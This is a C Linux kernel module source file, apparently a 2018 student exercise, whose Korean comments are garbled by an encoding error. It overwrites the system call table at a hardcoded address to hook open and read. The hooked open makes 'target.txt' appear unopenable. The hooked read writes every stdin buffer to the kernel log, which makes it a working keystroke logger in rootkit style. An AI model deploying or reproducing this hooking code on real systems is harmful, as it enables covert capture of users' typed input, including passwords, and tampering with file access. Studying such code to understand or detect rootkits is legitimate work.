/* ----------------------------------------------------------------------------------------------------
*  ����: hook.c
*  ���	: ��ŷ ����� ���� ���α׷�
*  ������: 201520934 ������, ������ ������
*  ��¥	: 1�� ���� : 2018�� 5�� 24��
*----------------------------------------------------------------------------------------------------*/
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include "hook.h"

/*
 * sys_call_table address
 */
void **org_syscall_table = (void **)0xc08832d0;

/*
 * original syscall pointer
 */
asmlinkage long (*org_open)(char *buf, int flags, mode_t mode); //org_open�Լ� ����
asmlinkage long (*org_read)(unsigned int fd, char __user *buf, size_t count); //org_read�Լ� ����

#define IN_USER         0x01 //����
#define IN_KERNEL       0x00 //Ŀ��
#define KEY_BACKSPACE   0x7f //�齺���̽�
/*
 * new system call function (fork, vfork, clone, execve, open)
 */
asmlinkage long new_open(char __user *filename, int flags, mode_t mode) //��ŷ ���� open
{
	long ret;

	ret = (*org_open)(filename, flags, mode); //������ open�Լ� ȣ��
	if (!strcmp(filename, "./target.txt")) { //������ target.txt�� ���
			ret = -1; //ret�� = -1
			printk(KERN_INFO "target.txt open\n"); //Ŀ�� �޽��� ���
	}
	
	return ret;	//ret�� ����(target.txt�� �� target.txt�� �����Կ��� �ұ��ϰ� -1�� ����)
}

asmlinkage long new_read(unsigned int fd, char __user *buf, size_t count){ //��ŷ ���� read
	long ret;
	ret = (*org_read)(fd, buf, count); //������ read�Լ� ȣ��
	if(fd == 0){ //stdin�� ���
			if(*buf == KEY_BACKSPACE) //�� �����̽��� ������ ���(���� �̻��� ������ ��µ�)
					printk(KERN_INFO "BACKSPACE\n"); //BACKSPACE������ Ŀ�ο��� ���
			else printk(KERN_INFO "buf : %s\n", buf); //buv���� Ŀ�ο��� ���
	}
	return ret; //ret�� ��ȯ
}
int hook_save(void) //���� �Լ� ����
{
	printk(KERN_INFO "%s : save start\n", __func__);

	org_open = org_syscall_table[__NR_open]; //���� open�ý����� ����
	org_read = org_syscall_table[__NR_read]; //���� read�ý����� ����


	return 0;
}

int hook_start(void)
{
	printk(KERN_INFO "%s : start start\n", __func__); 

	GPF_DISABLE(); //��ŷ�� ���� �� �� �ɾ���(�� ���� ���� ������ write�� ���� �ý��� ������ �� �� ����)

	org_syscall_table[__NR_open] = (void *)new_open; //new_open�� ���� open��ġ�� ����
	org_syscall_table[__NR_read] = (void *)new_read; //new_read�� ���� read��ġ�� ����
	
	GPF_ENABLE(); //�ɾ��� ���� Ǯ����

	return 0;
}

int hook_stop(void)
{
	printk(KERN_INFO "%s : stop start\n", __func__);

	GPF_DISABLE();
	org_syscall_table[__NR_open] = (void *)org_open; //���� open�� �ٽ� ���̺� ����
	org_syscall_table[__NR_read] = (void *)org_read; //���� read�� �ٽ� ���̺� ����
	GPF_ENABLE();

	return 0;
}
